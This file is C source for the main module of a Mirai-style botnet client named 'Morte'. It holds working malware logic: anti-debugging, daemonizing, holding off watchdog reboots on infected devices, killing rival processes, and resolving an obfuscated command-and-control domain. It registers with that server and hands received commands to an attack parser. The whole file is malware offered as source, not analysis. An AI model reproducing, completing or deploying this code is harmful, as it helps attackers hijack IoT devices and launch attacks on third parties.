#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <sys/stat.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/attack.h"
#include "headers/resolv.h"
#include "headers/killer.h"
#include "headers/util.h"

#define SINGLE_INSTANCE_PORT 12121

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0;
int disable_counter = 0;
int killer_enabled = 1;
int retry_count = 0;
int reconnect_delay = 5;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;
char bot_id[32] = {0};

#ifdef DEBUG
static void segv_handler(int sig, siginfo_t *si, void *unused)
{
    printf("got SIGSEGV at address: 0x%lx\n", (long)si->si_addr);
    exit(EXIT_FAILURE);
}
#endif

#ifdef WATCHDOG
void watchdog_maintain(void)
{
    watchdog_pid = fork();
    if (watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    while (TRUE)
    {

        table_unlock_val(TABLE_MISC_WATCHDOG);
        table_unlock_val(TABLE_MISC_WATCHDOG2);
        table_unlock_val(TABLE_MISC_WATCHDOG3);
        table_unlock_val(TABLE_MISC_WATCHDOG4);
        table_unlock_val(TABLE_MISC_WATCHDOG5);
        table_unlock_val(TABLE_MISC_WATCHDOG6);
        table_unlock_val(TABLE_MISC_WATCHDOG7);
        table_unlock_val(TABLE_MISC_WATCHDOG8);
        table_unlock_val(TABLE_MISC_WATCHDOG9);

        if ((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG3, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG4, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG5, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG6, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG7, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG8, NULL), 2)) != -1 ||
            (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG9, NULL), 2)) != -1)
        {
#ifdef DEBUG
            printf("[Morte_watchdog] Found a valid watchdog driver\n");
#endif
            found = TRUE;
            ioctl(watchdog_fd, 0x80045704, &timeout);
        }

        if (found)
        {
            while (TRUE)
            {
#ifdef DEBUG
                printf("[Morte_watchdog] Sending keep-alive ioctl call to the watchdog driver\n");
#endif
                ioctl(watchdog_fd, 0x80045705, 0);
                sleep(10);
            }
        }

        table_lock_val(TABLE_MISC_WATCHDOG);
        table_lock_val(TABLE_MISC_WATCHDOG2);
        table_lock_val(TABLE_MISC_WATCHDOG3);
        table_lock_val(TABLE_MISC_WATCHDOG4);
        table_lock_val(TABLE_MISC_WATCHDOG5);
        table_lock_val(TABLE_MISC_WATCHDOG6);
        table_lock_val(TABLE_MISC_WATCHDOG7);
        table_lock_val(TABLE_MISC_WATCHDOG8);
        table_lock_val(TABLE_MISC_WATCHDOG9);

        if (++retry_count > 6)
        {
#ifdef DEBUG
            printf("[Morte_watchdog] Failed to find a valid watchdog driver for 1 minute\n");
#endif
            retry_count = 0;
        }

        sleep(10);
    }

    exit(0);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

#ifndef DEBUG
    sigset_t sigs;

    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTRAP, anti_gdb_entry);

#endif

#ifdef DEBUG
    printf("Morte debug mode\n");
    sleep(1);
#endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    ensure_single_instance();
    rand_init();

    util_zero(id_buf, 32);
    if (argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_strcpy(bot_id, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    attack_init();
    killer_init();
    watchdog_maintain();

#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

    attack_init();

#ifndef WATCHDOG
    watchdog_maintain();
#endif

#ifndef KILLER
    killer_init();
#endif

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        if (fd_serv == -1)
            establish_connection();

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 4 == 0)
            {
                if (send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL) == -1)
                {
#ifdef DEBUG
                    printf("[Morte_main] Ping failed, tearing down connection (errno = %d)\n", errno);
#endif
                    if (fd_serv != -1)
                        teardown_connection();
                    continue;
                }
            }
        }

        if (++disable_counter % 30 == 0)
        {
            disable_commands();
#ifdef DEBUG
            printf("[Morte_main] Refreshed disabled commandห protection.\n");
#endif
        }

        if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
        {
            struct sockaddr_in cli_addr;
            socklen_t cli_addr_len = sizeof(cli_addr);

            accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);

#ifdef DEBUG
            printf("[Morte_main] Detected newer instance running! Killing self\n");
#endif

            kill(pgid * -1, 9);
            if (watchdog_pid != 0)
                kill(watchdog_pid, 9);
            exit(0);
        }

        if (pending_connection)
        {
            pending_connection = FALSE;

            if (!FD_ISSET(fd_serv, &fdsetwr))
            {
#ifdef DEBUG
                printf("[Morte_main] timed out while connecting to CNC\n");
#endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err != 0)
                {
#ifdef DEBUG
                    printf("[Morte_main] error while connecting to CNC code=%d\n", err);
#endif
                    close(fd_serv);
                    fd_serv = -1;
                    close(fd_serv);
                    fd_serv = -1;

                    reconnect_delay *= 2;
                    if (reconnect_delay > 60)
                        reconnect_delay = 60;

                    sleep(reconnect_delay);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if (id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }
                    table_unlock_val(TABLE_VERSION);
                    char *version = table_retrieve_val(TABLE_VERSION, NULL);
                    send(fd_serv, version, 1, MSG_NOSIGNAL);
                    table_lock_val(TABLE_VERSION);

#ifdef DEBUG
                    printf("[Morte_main] connected to CNC.\n");
#endif
                }
            }
        }
        else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
#ifdef DEBUG
                printf("[Morte_main] lost connection with CNC (errno = %d) 1\n", errno);
#endif
                teardown_connection();
                continue;
            }

            if (len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if (len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
            if (n == -1)
            {
                if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if (n == 0)
            {
#ifdef DEBUG
                printf("[Morte_main] lost connection with CNC (errno = %d) 2\n", errno);
#endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);

#ifdef DEBUG
            printf("[Morte_main] received %d bytes from CNC\n", len);
#endif

            if (len > 0)
                attack_parse(rdbuf, len);
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    struct resolv_entries *entries;

    table_unlock_val(TABLE_CNC_DOMAIN);
    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
    table_lock_val(TABLE_CNC_DOMAIN);
    if (entries == NULL)
    {
#ifdef DEBUG
        printf("[Morte_main] Failed to resolve CNC address\n");
#endif
        return;
    }
    srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    resolv_entries_free(entries);

    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);

#ifdef DEBUG
    printf("[Morte_main] Resolved domain\n");
#endif
}

static void establish_connection(void)
{
#ifdef DEBUG
    printf("[Morte_main] attempting to connect to CNC\n");
#endif

    if ((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[Morte_main] failed to call socket(). Errno = %d\n", errno);
#endif
        return;
    }

    struct timeval timeout = {10, 0};
    setsockopt(fd_serv, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
    setsockopt(fd_serv, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    if (resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
}

static void teardown_connection(void)
{
#ifdef DEBUG
    printf("[Morte_main] tearing down connection to CNC!\n");
#endif

    if (fd_serv != -1)
        close(fd_serv);

    fd_serv = -1;
    sleep(1);
}

static void ensure_single_instance(void)
{
    char *tbl_exec_instance;
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1, tbl_exec_instance_len = 0;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127, 0, 0, 1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[Morte_main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        table_unlock_val(TABLE_INSTANCE_EXISTS);
        tbl_exec_instance = table_retrieve_val(TABLE_INSTANCE_EXISTS, &tbl_exec_instance_len);
        write(STDOUT, tbl_exec_instance, tbl_exec_instance_len);
        write(STDOUT, "\n", 1);
        table_lock_val(TABLE_INSTANCE_EXISTS);

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[Morte_main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }

        sleep(2);
        close(fd_ctrl);
        // killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        exit(0);
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[Morte_main] Failed to call listen() on fd_ctrl\n");
            close(fd_ctrl);
            sleep(5);
            exit(0);
#endif
        }
#ifdef DEBUG
        printf("[Morte_main] We are the only process on this system!\n");
#endif
    }
}
